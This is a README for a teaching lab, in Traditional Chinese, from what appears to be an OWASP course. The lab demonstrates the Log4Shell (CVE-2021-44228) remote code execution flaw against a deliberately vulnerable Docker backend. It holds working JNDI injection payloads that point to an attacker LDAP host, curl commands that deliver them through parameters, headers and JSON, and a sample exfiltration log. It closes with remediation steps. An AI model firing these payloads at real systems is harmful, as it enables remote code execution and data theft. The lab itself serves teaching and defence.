# A06:2021 - Vulnerable and Outdated Components
# Log4Shell (CVE-2021-44228) 漏洞展示

## 漏洞說明

**CVE-2021-44228**（又稱 Log4Shell）是 Apache Log4j 2.x 的嚴重遠端程式碼執行（RCE）漏洞。

- **影響版本**：Log4j 2.0-beta9 至 2.14.1
- **CVSS 評分**：10.0（Critical）
- **漏洞類型**：遠端程式碼執行（RCE）

### 漏洞原理

Log4j 在處理日誌訊息時會解析 `${...}` 格式的 lookup 語法。攻擊者可利用 JNDI（Java Naming and Directory Interface）lookup 功能注入惡意 payload：

```
${jndi:ldap://attacker.com/exploit}
```

當 Log4j 解析此 payload 時，會：
1. 連接到攻擊者控制的 LDAP 伺服器
2. 下載惡意 Java class 檔案
3. 在受害者 JVM 中執行惡意程式碼

---

## 環境架構

```
┌─────────────────────────────────────────────────────────────────┐
│                      Docker Network                              │
│  ┌──────────────────┐          ┌──────────────────────────────┐ │
│  │  backend-log4shell │          │        attacker              │ │
│  │  (Port 8083)       │          │  ┌───────────────────────┐  │ │
│  │                    │          │  │ LDAP Server (1389)    │  │ │
│  │  Java 8u181        │◄─────────┤  │ HTTP Server (8888)    │  │ │
│  │  Log4j 2.14.1      │          │  │ Callback (9999)       │  │ │
│  │                    │          │  └───────────────────────┘  │ │
│  │  /flag.txt 🚩      │          │  /var/log/attacker.log      │ │
│  └──────────────────┘          └──────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

### 容器說明

| 容器名稱 | 端口 | 說明 |
|---------|------|------|
| `owasp-backend-log4shell` | 8083 | 有漏洞的後端（Java 8 + Log4j 2.14.1） |
| `owasp-attacker` | 1389, 8888, 9999 | 攻擊者伺服器（LDAP + HTTP + Callback） |

---

## 使用方式

### 1. 啟動 Docker 環境

```bash
# 在專案根目錄執行
cd /path/to/course_owasp
docker-compose up -d --build
```

### 2. 確認服務已啟動

```bash
# 檢查 Log4Shell 後端狀態
curl http://localhost:8083/api/log4j/status

# 預期回應：
# {"log4j_version":"2.14.1","vulnerable":true,"cve":"CVE-2021-44228",...}
```

### 3. 建立 Python 虛擬環境

```bash
# 進入腳本目錄
cd scripts/a06

# 建立虛擬環境
python3 -m venv venv

# 啟用虛擬環境
# macOS / Linux:
source venv/bin/activate

# Windows:
# venv\Scripts\activate

# 安裝依賴套件
pip install -r requirements.txt
```

### 4. 執行攻擊腳本

```bash
# 使用所有攻擊方式
python exploit.py

# 只使用特定攻擊方式
python exploit.py --method param      # URL 參數注入
python exploit.py --method header     # User-Agent Header 注入
python exploit.py --method body       # JSON Body 注入
python exploit.py --method x-api-version  # X-Api-Version Header 注入

# 指定目標（預設為 localhost:8083）
python exploit.py --target http://localhost:8083
```

### 5. 驗證攻擊結果

```bash
# 查看攻擊者容器的日誌
docker exec -it owasp-attacker cat /var/log/attacker.log
```

若攻擊成功，會看到類似以下的日誌：

```
[2024-12-04 10:30:45] [LDAP] Connection from 172.20.0.5:54321
[2024-12-04 10:30:45] [LDAP] Sending malicious JNDI Reference
[2024-12-04 10:30:45] [HTTP] GET request: /Exploit.class
[2024-12-04 10:30:45] [HTTP] Served Exploit.class (1234 bytes)
[2024-12-04 10:30:46] ==================================================
[2024-12-04 10:30:46] [CALLBACK] 🎉 FLAG RECEIVED!
[2024-12-04 10:30:46] [CALLBACK] From: 172.20.0.5
[2024-12-04 10:30:46] [CALLBACK] Body: flag=FLAG{log4j_cve_2021_44228_pwned}&hostname=...
[2024-12-04 10:30:46] ==================================================
```

---

## 攻擊向量

此漏洞可透過多種方式觸發，只要使用者輸入最終被 Log4j 記錄：

### 1. URL 參數

```bash
curl 'http://localhost:8083/api/log4j/search?keyword=${jndi:ldap://attacker:1389/Exploit}'
```

### 2. HTTP Header（User-Agent）

```bash
curl -H 'User-Agent: ${jndi:ldap://attacker:1389/Exploit}' \
     'http://localhost:8083/api/log4j/search?keyword=test'
```

### 3. HTTP Header（X-Api-Version）

```bash
curl -H 'X-Api-Version: ${jndi:ldap://attacker:1389/Exploit}' \
     'http://localhost:8083/api/log4j/search?keyword=test'
```

### 4. JSON Body

```bash
curl -X POST 'http://localhost:8083/api/log4j/login' \
     -H 'Content-Type: application/json' \
     -d '{"username":"${jndi:ldap://attacker:1389/Exploit}","password":"test"}'
```

---

## 修復方式

### 方法 1：升級 Log4j（推薦）

升級至 Log4j **2.17.1** 或更新版本：

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

### 方法 2：設定系統屬性

對於 Log4j 2.10.0 至 2.14.1，可設定：

```bash
-Dlog4j2.formatMsgNoLookups=true
```

或設定環境變數：

```bash
LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

### 方法 3：移除 JndiLookup 類別

```bash
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
```

---

## 檔案說明

```
scripts/a06/
├── README.md           # 本說明文件
├── exploit.py          # 攻擊腳本
├── requirements.txt    # Python 依賴套件
└── venv/               # Python 虛擬環境（執行後產生）
```

---

## 參考資料

- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [OWASP Top 10:2021 - A06 Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)

---

## ⚠️ 警告

**此專案僅供教學演示使用！**

- 請勿將此技術用於未經授權的系統
- 請勿在生產環境中執行有漏洞的程式碼
- 使用者須自行承擔所有法律責任
